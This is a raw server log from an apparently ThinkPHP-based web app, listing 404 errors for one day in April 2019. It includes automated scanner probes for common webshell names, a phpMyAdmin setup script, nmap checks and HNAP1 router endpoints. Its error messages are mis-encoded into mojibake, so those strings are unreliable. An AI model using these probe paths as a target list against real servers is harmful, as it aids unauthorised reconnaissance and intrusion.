INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000214s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T15:23:32+08:00 ] 61.157.96.10 /Public/Wchat/js/cvphp.js
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000205s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T15:40:23+08:00 ] 101.132.103.15 /she.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000225s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T15:40:26+08:00 ] 101.132.103.15 /test.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000225s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T15:40:29+08:00 ] 101.132.103.15 /hh.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000212s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T15:40:30+08:00 ] 101.132.103.15 /pe.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: [ app_init ] --END-- [ RunTime:0.000257s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T17:42:32+08:00 ] 139.162.88.63 /echo.php?info=1234567890
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000213s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T18:31:11+08:00 ] 23.225.147.66 /phpMyAdmin/scripts/setup.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000232s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T21:06:25+08:00 ] 42.236.78.39 /sdk
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000228s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:Sdk

[ 2019-04-16T21:06:25+08:00 ] 42.236.78.39 /nmaplowercheck1555419985
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000217s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:Nmaplowercheck1555419985

[ 2019-04-16T21:06:25+08:00 ] 42.236.78.39 /sdk
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000243s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T21:06:25+08:00 ] 42.236.78.39 /nmaplowercheck1555419985
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
INFO: [ app_init ] --END-- [ RunTime:0.000236s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T21:06:25+08:00 ] 42.236.78.39 /HNAP1
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000248s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:HNAP1

[ 2019-04-16T21:06:25+08:00 ] 42.236.78.39 /HNAP1
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000278s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T21:06:25+08:00 ] 42.236.78.39 /evox/about
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000258s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:Evox

[ 2019-04-16T21:06:25+08:00 ] 42.236.78.39 /evox/about
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000266s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T21:07:02+08:00 ] 42.236.78.37 /sdk
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000201s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:Sdk

[ 2019-04-16T21:07:02+08:00 ] 42.236.78.37 /sdk
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000217s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T21:07:02+08:00 ] 42.236.78.37 /nmaplowercheck1555420021
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000256s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:Nmaplowercheck1555420021

[ 2019-04-16T21:07:02+08:00 ] 42.236.78.37 /nmaplowercheck1555420021
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000008s ]
INFO: [ app_init ] --END-- [ RunTime:0.000199s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T21:07:02+08:00 ] 42.236.78.37 /evox/about
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000008s ]
INFO: [ app_init ] --END-- [ RunTime:0.000209s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:Evox

[ 2019-04-16T21:07:02+08:00 ] 42.236.78.37 /evox/about
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000214s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T21:07:02+08:00 ] 42.236.78.37 /HNAP1
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000215s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:HNAP1

[ 2019-04-16T21:07:02+08:00 ] 42.236.78.37 /HNAP1
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000008s ]
INFO: [ app_init ] --END-- [ RunTime:0.000199s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:404

[ 2019-04-16T21:51:38+08:00 ] 103.66.181.117 /market/detail?symbol=ethusdt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000213s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:Market

[ 2019-04-16T21:51:39+08:00 ] 103.66.181.108 /market/detail?symbol=ethusdt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000213s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:Market

[ 2019-04-16T21:51:39+08:00 ] 103.66.181.105 /market/detail?symbol=ethusdt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000217s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:Market

[ 2019-04-16T21:51:40+08:00 ] 103.66.181.125 /market/detail?symbol=ethusdt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: [ app_init ] --END-- [ RunTime:0.000309s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:Market

[ 2019-04-16T21:51:40+08:00 ] 103.66.181.112 /market/detail?symbol=ethusdt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000236s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:Market

[ 2019-04-16T21:58:37+08:00 ] 103.66.181.103 /market/detail?symbol=ethusdt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000210s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:Market

[ 2019-04-16T21:58:37+08:00 ] 103.66.181.117 /market/detail?symbol=ethusdt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000213s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:Market

[ 2019-04-16T21:58:38+08:00 ] 103.66.181.112 /market/detail?symbol=ethusdt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000237s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:Market

[ 2019-04-16T22:08:27+08:00 ] 103.66.181.117 /market/detail?symbol=ethusdt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000215s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:Market

[ 2019-04-16T22:08:27+08:00 ] 103.66.181.102 /market/detail?symbol=ethusdt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000214s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:Market

[ 2019-04-16T22:08:28+08:00 ] 103.66.181.119 /market/detail?symbol=ethusdt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000252s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:Market

[ 2019-04-16T22:08:34+08:00 ] 103.66.181.116 /market/detail?symbol=ethusdt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
INFO: [ app_init ] --END-- [ RunTime:0.000243s ]
ERR: Êó†Ê≥ïÂä†ËΩΩÊ®°Âùó:Market

